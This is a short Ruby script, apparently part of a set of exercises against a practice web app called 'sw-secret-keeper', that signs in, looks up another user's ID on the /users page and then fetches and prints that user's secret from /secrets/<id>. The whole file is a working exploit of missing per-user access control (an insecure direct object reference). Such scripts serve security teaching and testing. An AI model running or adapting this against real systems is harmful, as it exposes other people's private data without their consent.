require_relative '../scripts'

class Scripts
  # APP: sw-secret-keeper
  class NoUserSpecificEncryption
    include Helper

    def crack

      signin

      user_id = get_user_row('iam@thebatman.com').attribute('data-user-id')

      agent.get("/secrets/#{user_id}")
      puts Nokogiri.parse(agent.page.body).css('.secret p').text
    end

    def random_name
      "david+#{rand(10000000)}"
    end

    def get_user_row(matcher)
      agent.get('/users')
      Nokogiri.parse(agent.page.body).css('tr').detect { |node| node.text =~ /#{matcher}/ }
    end
  end
end

Scripts::NoUserSpecificEncryption.new.crack